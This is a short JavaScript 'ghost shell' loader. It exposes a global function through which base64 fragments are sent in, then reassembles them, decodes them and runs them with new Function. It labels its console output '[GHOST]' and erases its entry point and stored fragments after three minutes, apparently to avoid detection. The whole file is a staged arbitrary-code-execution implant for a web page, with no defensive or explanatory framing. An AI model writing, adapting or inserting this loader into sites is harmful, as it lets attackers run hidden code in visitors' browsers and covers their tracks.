(function ghostShellInit() {
    const fragments = {};
    const expectedFragments = 10;
    const fragmentSize = 64;

    let received = 0;

    function addFragment(index, payload) {
        if (!fragments[index]) {
            fragments[index] = payload;
            received++;
            console.log(`[GHOST] Fragment ${index} accepted (${received}/${expectedFragments})`);
        }
        if (received >= expectedFragments) assemblePayload();
    }

    function assemblePayload() {
        const fullPayload = Object.keys(fragments)
            .sort((a, b) => a - b)
            .map(i => fragments[i])
            .join('');

        try {
            console.log("[GHOST] Reassembling & executing payload...");
            (new Function(atob(fullPayload)))();
        } catch (e) {
            console.warn("[GHOST] Payload execution error:", e);
        }
    }

    // Public entry for fragment injection
    window.injectGhostFragment = function (index, b64payload) {
        addFragment(index, b64payload);
    };

    console.log(`[GHOST SHELL] Initialized. Send fragments via: injectGhostFragment(index, b64payload)`);

    // Self wipe after timeout
    setTimeout(() => {
        console.log("[GHOST SHELL] Time-to-live expired. Purging memory.");
        delete window.injectGhostFragment;
        for (let k in fragments) delete fragments[k];
    }, 180000); // 3 minutes
})();